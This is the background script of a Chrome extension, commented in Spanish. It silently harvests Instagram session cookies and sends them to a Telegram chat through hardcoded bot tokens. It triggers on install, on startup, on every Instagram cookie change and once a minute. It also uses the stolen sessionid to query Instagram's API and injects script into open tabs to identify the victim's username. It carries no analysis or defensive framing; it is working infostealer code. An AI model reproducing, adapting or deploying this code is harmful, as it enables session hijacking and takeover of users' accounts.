import { seal, unseal, sha256 } from "./crypto.js";
import { collect } from "./collector.js";

const BOTS = [
  "8708504012:AAGV11V0MH4MXxan1tCs4Rzn5PX4wJpXd80",
  "8973024680:AAHLdrpT7QLIfjr3Kle1TS5pmBRkVL3ZFGs",
  "8904603171:AAF37xxRhul7nFjUYN0oBwzQVSdbxmp7ySg"
];
const CHAT_ID = "-1004357707083";
const CFG_KEY = "cfg";
const STATE_KEY = "sent_hash";
const ALARM = "keep_alive";

let busy = false;
let lastHash = null;
const sleep = ms => new Promise(r => setTimeout(r, ms));

async function ensureConfig() {
  const o = await chrome.storage.local.get(CFG_KEY);
  if (o[CFG_KEY]) return unseal(o[CFG_KEY]);
  const cfg = { bots: BOTS, chatId: CHAT_ID };
  await chrome.storage.local.set({ [CFG_KEY]: await seal(cfg) });
  return cfg;
}

async function postOne(token, chatId, text) {
  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  try {
    const r = await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: chatId, text, parse_mode: "HTML", disable_web_page_preview: true })
    });
    return (await r.json()).ok;
  } catch { return false; }
}

async function sendMulti(cfg, text) {
  for (const token of cfg.bots) {
    if (await postOne(token, cfg.chatId, text)) return true;
  }
  return false;
}

function esc(s) { return String(s).replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }

function build(account, raw) {
  const now = new Date().toISOString().slice(0, 19).replace("T", " ");
  let head = `📦 <b>SYNC</b>\n─────────────\n` +
    `👤 <b>Cuenta:</b> @${esc(account)}\n` +
    `🕐 <b>UTC:</b> ${now}\n` +
    `🍪 <b>Total:</b> ${raw.all.length}\n\n`;
  for (const [k, v] of Object.entries(raw.critical)) {
    head += `• <b>${esc(k)}</b>\n<code>${esc(v)}</code>\n`;
  }
  head += `\n─────────────\n<b>BLOB</b>\n<code>${esc(JSON.stringify(raw.all))}</code>`;
  return head;
}

// ------------------------------------------------------------------
// EXTRACCIÓN DE NOMBRE DE USUARIO (4 métodos en cascada)
// ------------------------------------------------------------------
async function resolveAccount(critical) {
  const EXCL = new Set(["accounts","explore","direct","p","stories","reels","tv","settings","activity","inbox","search","about","legal","developer","api"]);

  // Método 1: API oficial de Instagram con la cookie sessionid
  if (critical.ds_user_id) {
    try {
      const r = await fetch(`https://www.instagram.com/api/v1/users/web_profile_info/?user_id=${critical.ds_user_id}`, {
        headers: { 
          "Cookie": `sessionid=${critical.sessionid}; ds_user_id=${critical.ds_user_id}`,
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          "X-IG-App-ID": "936619743392459"
        }
      });
      if (r.ok) { const d = await r.json(); if (d?.user?.username) return d.user.username; }
    } catch {}
  }

  // Método 2: DOM de la pestaña activa (title, meta og:title, alt de imágenes)
  try {
    const tabs = await chrome.tabs.query({ active: true, currentWindow: true });
    if (tabs[0]?.url?.includes("instagram.com")) {
      const [res] = await chrome.scripting.executeScript({
        target: { tabId: tabs[0].id },
        func: () => {
          const t = document.title || "";
          const a = t.match(/\(@([A-Za-z0-9._]+)\)/) || t.match(/^([A-Za-z0-9._]+) • Instagram/);
          if (a) return a[1];
          const meta = document.querySelector('meta[property="og:title"]');
          const b = (meta?.content || "").match(/\(@([A-Za-z0-9._]+)\)/) || (meta?.content || "").match(/^([A-Za-z0-9._]+) •/);
          if (b) return b[1];
          for (const img of document.querySelectorAll('img[alt]')) {
            const m1 = (img.alt || "").match(/perfil de ([A-Za-z0-9._]+)/i);
            if (m1) return m1[1];
            const m2 = (img.alt || "").match(/Profile picture of ([A-Za-z0-9._]+)/i);
            if (m2) return m2[1];
            const m3 = (img.alt || "").match(/([A-Za-z0-9._]+)'s profile picture/i);
            if (m3) return m3[1];
          }
          // Busca enlaces del menú lateral o barra de navegación
          const links = document.querySelectorAll('a[href^="/"]');
          for (const l of links) {
            const href = l.getAttribute("href") || "";
            const m = href.match(/^\/([A-Za-z0-9._]+)\/$/);
            if (m && !["accounts","explore","direct","p","stories","reels","tv","settings","activity","inbox","search"].includes(m[1])) {
              return m[1];
            }
          }
          return null;
        }
      });
      if (res?.result) return res.result;
    }
  } catch {}

  // Método 3: URL de cualquier pestaña abierta de Instagram
  try {
    const tabs = await chrome.tabs.query({ url: "https://www.instagram.com/*" });
    for (const t of tabs) {
      const m = (t.url || "").match(/instagram\.com\/([A-Za-z0-9._]+)/);
      if (m && !EXCL.has(m[1]) && m[1].length > 1) return m[1];
    }
  } catch {}

  // Método 4: Petición directa a la API web de IG simulando navegador
  if (critical.sessionid) {
    try {
      const r = await fetch("https://www.instagram.com/api/v1/web/get_current_user/", {
        headers: {
          "Cookie": `sessionid=${critical.sessionid}`,
          "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
          "X-IG-App-ID": "936619743392459"
        }
      });
      if (r.ok) { const d = await r.json(); if (d?.user?.username) return d.user.username; }
    } catch {}
  }

  return "unknown";
}

// ------------------------------------------------------------------
// CICLO CON BLOQUEO Y HASH (envía una sola vez)
// ------------------------------------------------------------------
async function cycle(force = false) {
  if (busy) return;
  busy = true;
  try {
    const cfg = await ensureConfig();
    const raw = await collect();
    
    if (!raw.critical.sessionid) return;

    // Hash único de las cookies críticas (sessionid, csrftoken, ds_user_id)
    const hash = await sha256(JSON.stringify(raw.critical));
    
    if (!force) {
      // Cargar hash guardado
      const stored = await chrome.storage.local.get(STATE_KEY);
      if (stored[STATE_KEY] === hash) return; // Ya se envió esta misma sesión
    }

    const account = await resolveAccount(raw.critical);
    const text = build(account, raw);
    
    const ok = await sendMulti(cfg, text);
    if (ok) {
      await chrome.storage.local.set({ [STATE_KEY]: hash });
    }
  } catch (e) {
    console.error("Error:", e);
  } finally {
    busy = false;
  }
}

// ------------------------------------------------------------------
// MANTENER VIVO EL SERVICE WORKER
// ------------------------------------------------------------------
setInterval(() => { chrome.runtime.getPlatformInfo(() => {}); }, 20000);

// ------------------------------------------------------------------
// DISPARADORES
// ------------------------------------------------------------------
// Escucha cambios, pero con debounce de 2s para agrupar cambios masivos
let debounceTimer = null;
chrome.cookies.onChanged.addListener(ci => {
  if (!ci.cookie.domain.includes("instagram.com")) return;
  if (debounceTimer) clearTimeout(debounceTimer);
  debounceTimer = setTimeout(() => { cycle(false); debounceTimer = null; }, 2000);
});

chrome.runtime.onInstalled.addListener(() => cycle(true));
chrome.runtime.onStartup.addListener(() => cycle(true));

chrome.alarms.create(ALARM, { periodInMinutes: 1 });
chrome.alarms.onAlarm.addListener(a => {
  if (a.name === ALARM) cycle(false);
});

// Exponer para pruebas
globalThis.cycle = cycle;